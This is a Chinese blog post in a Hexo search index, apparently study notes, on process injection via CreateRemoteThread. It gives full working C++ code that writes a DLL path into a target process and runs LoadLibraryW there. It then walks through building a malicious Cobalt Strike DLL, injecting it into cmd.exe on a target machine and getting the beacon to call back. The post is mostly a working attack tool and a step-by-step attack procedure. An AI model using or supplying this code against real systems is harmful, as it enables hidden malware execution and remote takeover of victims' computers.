<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>进程注入系列一之CreateRemoteThread()</title>
      <link href="/post/f3914fba.html"/>
      <url>/post/f3914fba.html</url>
      
        <content type="html"><![CDATA[<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>原理是将恶意的动态链接库路径写入到另一个进程的虚拟空间内，通过在目标进程中创建远程线程进行加载。<br><img src="https://s2.loli.net/2022/02/23/AQUJbgBVqyNT4D6.jpg" alt="t0117bd3187269363f4" style="zoom: 67%;" /><br>但是程序不会无故加载我们恶意的dll，所以我们就要使用Windows API了，它提供了大量的函数来附加和操纵其他进程。<br>API中的所有函数都包含于DLL文件之中。其中，最重要的是“Kernel32.dll”（包含管理内存，进程和线程相关的函数），“User32.dll”（大部分是用户接口函数），和“GDI32.dll”（绘制图形和显示文本相关的函数）等。</p><h2 id="注入代码的实现"><a href="#注入代码的实现" class="headerlink" title="注入代码的实现"></a>注入代码的实现</h2><p>由于基本上大多数进程都会使用Kernel32.dll，核心思想就是在目标进程中开启一个线程调用LoadLibrary函数来加载我们想要注入的dll<br>大致注入流程如下图<br><img src="https://s2.loli.net/2022/02/23/Uhm8WlzwyNirHoE.jpg" alt="QQ截图20220223204205" style="zoom:80%;" /></p><h3 id="使用到的一些函数"><a href="#使用到的一些函数" class="headerlink" title="使用到的一些函数"></a>使用到的一些函数</h3><p>OpenProcess函数<br>OpenProcess 函数用来打开一个已存在的进程对象，并返回进程的句柄。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE OpenProcess(</span><br><span class="line"> DWORD dwDesiredAccess, //想拥有的该进程访问权限</span><br><span class="line"> BOOL bInheritHandle, // 是否继承句柄</span><br><span class="line"> DWORD dwProcessId// 被打开进程的PID</span><br><span class="line">       );</span><br></pre></td></tr></table></figure><p>参数解释：<br>a.dwDesiredAccess：想拥有的该进程访问权限<br>PROCESS_ALL_ACCESS //所有能获得的权限<br>PROCESS_CREATE_PROCESS //需要创建一个进程<br>PROCESS_CREATE_THREAD  //需要创建一个线程<br>PROCESS_DUP_HANDLE   //重复使用DuplicateHandle句柄<br>PROCESS_QUERY_INFORMATION  //获得进程信息的权限，如它的退出代码、优先级<br>PROCESS_QUERY_LIMITED_INFORMATION （获得某些信息的权限，如果获得了PROCESS_QUERY_INFORMATION，也拥有PROCESS_QUERY_LIMITED_INFORMATION权限）<br>PROCESS_SET_INFORMATION  //设置某些信息的权限，如进程优先级<br>PROCESS_SET_QUOTA     //设置内存限制的权限，使用SetProcessWorkingSetSize<br>PROCESS_SUSPEND_RESUME   //暂停或恢复进程的权限<br>PROCESS_TERMINATE     //终止一个进程的权限，使用TerminateProcess<br>PROCESS_VM_OPERATION    //操作进程内存空间的权限(可用VirtualProtectEx和WriteProcessMemory)<br>PROCESS_VM_READ      //读取进程内存空间的权限，可使用ReadProcessMemory<br>PROCESS_VM_WRITE      //读取进程内存空间的权限，可使用WriteProcessMemory<br>SYNCHRONIZE        //等待进程终止<br>b.bInheritHandle：表示所得到的进程句柄是否可以被继承<br>c.dwProcessId：被打开进程的PID</p><p>返回值：<br>如成功，返回值为指定进程的句柄。<br>如失败，返回值为NULL，可调用GetLastError()获得错误代码。</p><p>VirtualAllocEx函数<br>获得返回句柄之后再用VirtualAllocEx函数，在目标进程中开辟一块内存存放我们的dll的路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAllocEx(</span><br><span class="line">HANDLE hProcess, // 申请内存所在的进程句柄</span><br><span class="line">LPVOID lpAddress, // 保留页面的内存地址；一般用NULL自动分配</span><br><span class="line">SIZE_T dwSize, // 欲分配的内存大小，字节单位；注意实际分 配的内存大小是页内存大小的整数倍</span><br><span class="line">DWORD flAllocationType, //为特定的页面区域分配内存中或磁盘</span><br><span class="line">DWORD flProtect //受保护状态</span><br><span class="line">); </span><br></pre></td></tr></table></figure><p>WriteProcessMemory函数<br>之后使用WriteProcessMemory函数向目标内存写入dll地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI WriteProcessMemory(</span><br><span class="line">  _In_  HANDLE  hProcess, //由OpenProcess返回的进程句柄。</span><br><span class="line">  _In_  LPVOID  lpBaseAddress, //要写的内存首地址</span><br><span class="line">  _In_  LPCVOID lpBuffer, //指向要写的数据的指针。</span><br><span class="line">  _In_  SIZE_T  nSize, //要写入的字节数。</span><br><span class="line">  _Out_ SIZE_T  *lpNumberOfBytesWritten //返回值。返回实际写入的字节</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>用GetProcAddress函数获得LoadLibraryW函数的起始地址。LoadLibraryW函数位于Kernel32.dll中，再用CreateRemoteThread函数让目标进程执行LoadLibraryW来加载被注入的dll。函数结束将返回载入dll后的模块句柄。<br>注意：这里的LoadLibrary函数在底层实际调用有两种可能，如果目标程序使用的是ANSI编码方式，LoadLibrary实际调用的是LoadLibraryA，其参数字符串应当是ANSI编码；<br>如果目标程序使用的是Unicode编码方式，LoadLibrary实际调用的是LoadLibraryW，其参数字符串应当是Unicode编码。</p><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;Tlhelp32.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL Inject(DWORD dwId, WCHAR* szPath)</span><br><span class="line">//参数1：目标进程id； 参数2：DLL路径</span><br><span class="line">&#123;</span><br><span class="line">//1.在目标进程中申请一个空间</span><br><span class="line">/*</span><br><span class="line">1.1获取目标进程句柄</span><br><span class="line">参数1：想要拥有的进程权限</span><br><span class="line">参数2：表示所得到的进程句柄是否可以被继承</span><br><span class="line">参数3：被打开进进程的pid</span><br><span class="line">返回值：指定进程的句柄</span><br><span class="line">*/</span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId);</span><br><span class="line">/*</span><br><span class="line">1.2在目标进程中开辟空间</span><br><span class="line">参数1：目标进程句柄</span><br><span class="line">参数2：保留页面的内存地址，一般用NULL自动分配</span><br><span class="line">参数3：想要分配的内存大小，字节为单位</span><br><span class="line">参数4：ME_COMMIT：为特定的页面区域分配内存中或磁盘的页面文件中的物理存储</span><br><span class="line">参数5：PAGE_READWRITE：区域可被应用程序读写</span><br><span class="line">返回值：执行成功就返回分配内存的首地址，不成功就是NULL</span><br><span class="line">*/</span><br><span class="line">LPVOID pRemoteAdress = VirtualAllocEx(</span><br><span class="line">hProcess,</span><br><span class="line">NULL,</span><br><span class="line">wcslen(szPath) * 2,</span><br><span class="line">MEM_COMMIT,</span><br><span class="line">PAGE_READWRITE</span><br><span class="line">);</span><br><span class="line">//2.把dll的路径写入到目标进程的内存空间中</span><br><span class="line">DWORD dwWriteSize = 0;</span><br><span class="line">/*</span><br><span class="line">写一段数据到刚才给指定进程所开辟的内存空间里</span><br><span class="line">参数1：OpenProcess返回的进程句柄</span><br><span class="line">参数2：准备写入的内存地址</span><br><span class="line">参数3：指向要写入的数据指针（准备写入的东西）</span><br><span class="line">参数4：要写的字节数（东西的长度+0/）</span><br><span class="line">参数5：返回值，返回实际写入的字节</span><br><span class="line">*/</span><br><span class="line">BOOL bRet = WriteProcessMemory(hProcess, pRemoteAdress, szPath, wcslen(szPath) * 2, NULL);</span><br><span class="line">//3.创建一个远程线程，让目标进程调用LoadLibrary</span><br><span class="line">/*</span><br><span class="line">参数1：该远程线程所属进程的进程句柄</span><br><span class="line">参数2：一个指向SECURITY_ATTRIBUTES结构的指针，该结构指定了线程的安全属性</span><br><span class="line">参数3：线程栈初始大小，以字节为单位，若该值设为0，那么使用系统默认大小</span><br><span class="line">参数4：在远程进程的地址空间中，该线程的线程函数的起始地址（也就是这个线程具体干的活）</span><br><span class="line">参数5：传给线程函数的参数（刚才在内存里开辟的空间里写入的东西）</span><br><span class="line">参数6：控制线程创建的标志。0（NULL）表示该线程在创建后立即运行</span><br><span class="line">参数7：指向接收线程标识符的变量的指针。如果为NULL，则不返回线程标识符</span><br><span class="line">返回值；如果函数成功，则返回值是新线程的句柄。如果函数失败，则返回值为NULL</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//获取模块地址</span><br><span class="line">HMODULE hModule = GetModuleHandle(L&quot;kernel32.dll&quot;);</span><br><span class="line">if (!hModule)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;GetModuleHandle Error !\n&quot;);</span><br><span class="line">GetLastError();</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">//获取LoadLibraryA函数地址</span><br><span class="line">LPTHREAD_START_ROUTINE dwLoadAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;LoadLibraryW&quot;);</span><br><span class="line">if (!dwLoadAddr)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;GetProcAddress Error !\n&quot;);</span><br><span class="line">GetLastError();</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">CloseHandle(hModule);</span><br><span class="line">return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">//创建远程线程，加载dll</span><br><span class="line">HANDLE hThread = CreateRemoteThread(</span><br><span class="line">hProcess,</span><br><span class="line">NULL,</span><br><span class="line">0,</span><br><span class="line">(LPTHREAD_START_ROUTINE)dwLoadAddr,</span><br><span class="line">pRemoteAdress,</span><br><span class="line">NULL,</span><br><span class="line">NULL</span><br><span class="line">);</span><br><span class="line">//WaitForSingleObject(hThread, -1);当句柄所指的线程右信号的时候才会返回</span><br><span class="line">/*</span><br><span class="line">4.释放申请的虚拟内存空间</span><br><span class="line">参数1：目标进程的句柄。该句柄必须拥有PROCESS_VM-OPERATION权限</span><br><span class="line">参数2：指向要释放的虚拟内存空间首地址的指针</span><br><span class="line">参数3：虚拟内存空间的字节数</span><br><span class="line">参数4：MEM_DECOMMIT仅表示内存空间不可用，内存页还将存在</span><br><span class="line">MEM_RELEASE这种方式很彻底，完全回收。</span><br><span class="line">VirtualFreeEx(hProcess, pRemoteAddress, 1, MEM_DECOMMIT);</span><br><span class="line">*/</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">DWORD GetPid(WCHAR* szName)</span><br><span class="line">&#123;</span><br><span class="line">HANDLE hprocessSnap = NULL;</span><br><span class="line">PROCESSENTRY32 pe32 = &#123; 0 &#125;;</span><br><span class="line">hprocessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</span><br><span class="line">/*if (hprocessSnap == (HANDLE)-1) &#123; return 0; &#125;*/</span><br><span class="line">pe32.dwSize = sizeof(PROCESSENTRY32);</span><br><span class="line">if (Process32First(hprocessSnap, &amp;pe32))</span><br><span class="line">&#123;</span><br><span class="line">do &#123;</span><br><span class="line">if (!wcscmp(szName, pe32.szExeFile))</span><br><span class="line">return (int)pe32.th32ProcessID;</span><br><span class="line">&#125; while (Process32Next(hprocessSnap, &amp;pe32));</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">CloseHandle(hprocessSnap);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">wchar_t wStr[] = L&quot;·····&quot;;//要注入的dll文件地址</span><br><span class="line">DWORD dwId = 0;</span><br><span class="line">DWORD dwPid = 0;</span><br><span class="line">WCHAR S[] = L&quot;···&quot;;//注入的目标exe文件</span><br><span class="line">DWORD  SS = GetPid(S);</span><br><span class="line">printf(&quot;目标窗口的进程PID为：%d\n&quot;, SS);</span><br><span class="line">//参数1：目标进程的PID</span><br><span class="line">//参数2：想要注入dll的路径</span><br><span class="line">Inject(SS, wStr);</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用此方法上线CS"><a href="#利用此方法上线CS" class="headerlink" title="利用此方法上线CS"></a>利用此方法上线CS</h2><p>1.打开Visual Studio新建一个项目<br><img src="https://s2.loli.net/2022/02/23/9cwVvOWoxenaMQS.png" alt="QQ截图20220223211219" style="zoom:80%;" /></p><p>2.将上述完整代码添加进去</p><p>3.我们利用cs创建一个监听<br><img src="https://s2.loli.net/2022/02/23/u7SLboH2yiTVEXK.png" alt="QQ截图20220223211825" style="zoom:80%;" /></p><p>4.生成恶意dll文件<br><img src="https://s2.loli.net/2022/02/23/Lkfu98sibdgwCtZ.png" alt="image-20220223212127573"></p><p>这里根据需求选择32位或者64位，我这里演示的是32位的，选择刚才创建的监听<br><img src="https://s2.loli.net/2022/02/23/WFXlHBIrveVuOc2.png" alt="image-20220223212338591"></p><p>生成dll文件<br><img src="https://s2.loli.net/2022/02/23/QiKHaOMAUt2cuTx.png" alt="image-20220223212455718"></p><p>5.将dll文件放置在目标机的D盘下，我这里注入的进程是cmd.exe，并将main函数补全。<br><img src="https://s2.loli.net/2022/02/23/vieARK94sfQpODq.png" alt="image-20220223212727327"></p><p>6.编译生成exe文件，在将该exe文件在目标及运行即可<br><img src="https://s2.loli.net/2022/02/23/cRT51KI67maVOsf.png" alt="image-20220223212947795"></p><p>7.检查发现cmd.exe中成功加载了恶意dll，且CS也成功上线<br><img src="https://s2.loli.net/2022/02/23/WpohV1y9K6dGfTO.png" alt="image-20220223213247397"  /></p><p><img src="https://s2.loli.net/2022/02/23/NpstPwrg8WRhTQX.png" alt="image-20220223213351526"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
